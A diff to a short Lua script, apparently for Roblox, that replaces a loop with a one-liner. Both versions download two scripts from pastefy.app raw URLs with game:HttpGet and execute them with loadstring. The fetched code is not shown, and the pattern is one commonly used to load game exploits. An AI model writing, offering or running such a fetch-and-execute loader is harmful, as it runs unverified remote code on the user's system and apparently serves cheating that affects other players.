@@ -1,16 +1,1 @@
--- Load and run scripts one after another
-local scripts = {
-    "https://pastefy.app/YAiCtEd0/raw",
-    "https://pastefy.app/Pt1O0Ijt/raw"
-}
-
-for i, url in ipairs(scripts) do
-    local success, result = pcall(function()
-        local code = game:HttpGet(url, true)
-        loadstring(code)()
-    end)
-    
-    if not success then
-        warn("Error loading script " .. i .. ": " .. result)
-    end
-end
+loadstring(game:HttpGet("https://pastefy.app/YAiCtEd0/raw")..game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw"))()
